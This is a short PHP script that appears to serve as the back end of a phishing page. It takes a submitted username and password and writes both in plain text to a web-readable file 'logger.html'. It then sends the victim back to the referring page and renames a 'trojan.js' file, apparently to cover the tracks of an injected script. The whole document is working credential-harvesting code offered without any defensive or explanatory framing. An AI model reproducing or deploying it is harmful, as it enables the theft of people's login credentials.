<?
header('Location: ' . $_SERVER['HTTP_REFERER']);
$user = $_POST['username'];
$pass = $_POST['password'];
$fp = fopen ('logger.html','a');
fwrite ($fp, 'User :'.$user.'<br/>');
fwrite ($fp, 'Pass :'.$pass.'<br/>');
rename("trojan.js","trojan-down.js");
?>